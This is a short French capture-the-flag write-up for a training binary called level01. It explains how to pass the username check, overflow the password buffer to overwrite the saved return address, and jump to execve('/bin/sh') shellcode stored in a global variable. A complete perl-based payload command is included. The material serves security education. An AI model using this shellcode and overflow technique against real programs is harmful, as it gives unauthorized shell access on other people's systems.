
Une fois avec recupere l'executable puis l'avoir decompile, comme avec le premier flag,
On peut voir que le programme permet a un utilisateur de se connecter.
Il utilise la fonction `verify_user_name()` et si aucun probleme n'est signale il utilise `verify_user_pass()`.

Pour le username, c'est simple, en regardant la fonction `verify_user_name()` on comprend que notre premier input doit commencer par dat_wil.

Pour le password, on a un probleme, en fait aucun password ne fonctionne quand on porte attention au code.
Notre strategie va etre d'override le repertoire `eip`, qui est le repertoire qui stocke l'adresse de retour de la fonction `verify_user_pass()`.

On trouve le pading pour overflow `eip` quand on fait segfault le programme avec une entree utilisateur qui overflow.
On peut aussi le trouver avec gets() et ltrace

Et pour on va ecrire notre shellcode apres a l'emplacement de notre variable globale `a_user_name`.
On obtient son adresse avec gdb.
0x0804a040  a_user_name
`\x48\xa0\x04\x08`
0x0804a040 + 8 pour eviter l'entree du nom d'utilisateur.

Taille visee pour overflow
0x60 - 0x8 = 0x54


```(perl -e 'print "dat_wil" . "\x90"x8 . "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" . "\n"' ; perl -e 'print "\x90"x80 . "\x48\xa0\x04\x08" . "\n"' ; cat) | ~/level01```

`cat` garde `stdin` ouvert pour pouvoir interagir avec le shell.

<!-- Cet exercice porte a confusion avec son entree de mot de passe et d'utilisateur, mais ce sont juste des facon d'injecter du shellcode.

La taille du deuxieme buffer nous laisse override eip en faisant :
Il faut donc un padding de 0x50 puis notre adresse pointant vers 0x0804a040 + 8 pour eviter l'entree du nom d'utilisateur. -->